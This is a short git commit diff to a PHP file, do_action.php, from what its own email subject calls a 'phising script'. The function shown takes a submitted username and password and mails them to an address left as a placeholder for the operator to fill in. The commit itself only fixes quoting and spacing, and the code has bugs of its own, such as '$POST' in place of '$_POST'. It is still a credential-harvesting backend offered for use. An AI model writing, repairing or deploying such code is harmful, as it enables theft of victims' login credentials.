2634427780ab0fd92823c0abae55957a6ee901db
Muhammad Sheehab <sheehabx@gmail.com>
2020-02-20 02:32:33 +0600

    Fixed

--- do_action.php
+++ do_action.php
@@ -1,11 +1,14 @@
 <?php
 	mail_sender(){
-		$username = $POST[username];
-		$password = $POST[password];
+		$username = $POST['username'];
+		$password = $POST['password'];
+		
 		$reciever = "YOUR-EMAIL ADRRESS";
+		
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
 		$message .= "and password is ". $password;
+		
 		return mail($reciever, $subject, $message);
 	}
 	
